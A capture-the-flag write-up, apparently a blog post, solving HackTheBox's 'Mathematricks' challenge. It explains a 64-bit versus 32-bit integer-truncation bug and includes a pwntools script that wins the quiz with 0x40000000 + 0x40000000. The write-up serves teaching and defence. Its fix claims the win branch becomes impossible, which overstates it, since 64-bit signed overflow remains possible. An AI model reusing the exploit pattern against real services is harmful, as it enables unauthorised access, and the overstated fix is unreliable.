---
title: "Mathematricks"
date: 2026-12-06 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, integer-overflow, integer-truncation, cwe-197, logic-bug]
description: "A Very Easy Pwn challenge that is really a logic puzzle: a fully-mitigated binary asks for two positive numbers whose sum is negative. The trick is that the operands are validated as signed 64-bit but their sum is sign-checked in a 32-bit register, so 0x40000000 + 0x40000000 wraps to a negative int32."
---

## Overview

`Mathematricks` is a Very Easy HackTheBox **Pwn** challenge, but there is no memory corruption involved — the binary is built with full mitigations (Full RELRO, stack canary, NX, PIE, and even CET/IBT). It is a "tricky math" quiz: you answer a few questions over `nc`, and the last one is an [integer truncation](https://cwe.mitre.org/data/definitions/197.html) bug disguised as an impossible arithmetic request. Beat the quiz and the service prints the flag.

## The technique

After three trivia questions, the final challenge asks:

```
Q4: Enter 2 numbers n1, n2 where n1 > 0 and n2 > 0 and n1 + n2 < 0
```

At first glance that is impossible — two positive numbers can't sum to a negative one. The bug is a **width mismatch** between how the operands are validated and how their sum is checked. Decompiling the `game` function shows it reads each number with `strtoul()` into a **64-bit** variable and validates positivity at 64-bit width, but computes and sign-tests the sum in a **32-bit** register:

```nasm
mov    edx, eax            ; edx = (int32) n1
add    eax, edx            ; eax = (int32)n1 + (int32)n2   <-- 32-bit add
mov    [rbp-0x1c], eax     ; store sum as a 32-bit int
cmp    QWORD [rbp-0x18], 0 ; n1 > 0  checked at 64-bit
jle    fail
cmp    QWORD [rbp-0x10], 0 ; n2 > 0  checked at 64-bit
jg     ok
cmp    DWORD [rbp-0x1c], 0 ; sum < 0  checked at 32-bit
jns    fail                ; sign bit set -> read_flag()
```

So a value that is comfortably positive as a signed 64-bit integer can still overflow into a negative signed 32-bit integer once truncated. The canonical sign-flip pair is `0x40000000 + 0x40000000 = 0x80000000`, which is `INT_MIN` as an `int32`.

## Solution

The first three answers are plain trivia read straight out of the binary's strings: `1 + 1 = 2`, `2 - 1 = 1`, `1337 - 1337 = 0`. For Q4 send `n1 = n2 = 0x40000000` (1073741824): both are positive 64-bit values (passing the `> 0` gates), yet their low-32 sum is `0x80000000`, negative as an `int32`, which satisfies the `n1 + n2 < 0` check and calls `read_flag()`.

Create `solve.py`:

```python
#!/usr/bin/python3
from pwn import *
import sys
context.arch = 'amd64'
context.log_level = 'info'

IP   = sys.argv[1] if len(sys.argv) >= 2 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
r = remote(IP, PORT)

sla = lambda x, y: r.sendlineafter(x, y)

sla('🥸 ', '1')                  # menu: Play
sla('> ', '2')                   # Q1: 1 + 1
sla('> ', '1')                   # Q2: 2 - 1
sla('> ', '0')                   # Q3: 1337 - 1337
sla('n1: ', str(0x40000000))     # 1073741824  (>0 as i64)
sla('n2: ', str(0x40000000))     # >0 as i64; low32 sum overflows to negative i32

print('Flag --> ' + r.recvline_contains(b'HTB').strip().decode())
r.close()
```

Run it against the live instance:

```bash
python3 solve.py <target-ip> <target-port>
# Flag --> HTB{...}
```

## Why it worked

The check meant to make the win branch unreachable runs at a **narrower type** than the validation that precedes it. The positivity gates use the full 64-bit values, so there exists a whole range of inputs that pass them while their 32-bit-truncated sum wraps to negative. The developer effectively validated one number and tested a different (truncated) one.

## Fix / defense

Validate and compute at the **same** integer width. Storing the sum in a `long` (matching the 64-bit operands) makes the branch genuinely unreachable:

```c
long n1 = strtoul(a, 0, 0), n2 = strtoul(b, 0, 0);
long sum = n1 + n2;                 // compute at the validated width
if (n1 > 0 && n2 > 0 && sum < 0)    // now actually impossible
    read_flag();
```

More generally: reject inputs whose sum can overflow the result type, use a type wide enough for the worst case, and build with integer sanitizers (`-ftrapv` / UBSan) to catch truncation at runtime.
